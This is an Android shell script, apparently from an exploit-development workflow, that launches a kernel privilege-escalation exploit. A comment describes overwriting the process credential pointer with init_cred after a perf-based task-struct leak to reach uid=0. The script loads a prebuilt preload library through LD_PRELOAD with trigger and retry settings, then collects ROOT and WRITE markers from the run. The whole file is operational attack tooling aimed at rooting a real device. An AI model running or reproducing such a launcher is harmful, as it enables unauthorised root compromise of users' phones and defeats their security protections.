#!/system/bin/sh
# mt28g: Case-2 cred 覆写 — perf 泄露自身 task → *(task+0x820) = init_cred → uid=0
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt28g.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt28g.txt
RUNLOG=/data/local/tmp/mt28g_run.out
rm -f $DST; cp $SRC $DST; sync
echo "start $(date +%H:%M:%S)" > $LOG
am kill-all 2>&1 | tail -1
rm -f /data/local/tmp/root_marker.txt /data/local/tmp/root_shell.txt
timeout 260 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_CRED=1 \
  PSELECT_RETRY=6 \
  PSELECT_SKIP_WARMUP=1 \
  LD_PRELOAD=$DST /system/bin/sleep 200 > $RUNLOG 2>&1
echo "rc=$?" >> $LOG
grep -a 'mt28\|ROOT\|perf task\|WRITE\|futex trigger\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
if [ -f /data/local/tmp/root_marker.txt ]; then
  echo "ROOT MARKER: $(cat /data/local/tmp/root_marker.txt)" >> $LOG
fi
echo "=== DONE ===" >> $LOG
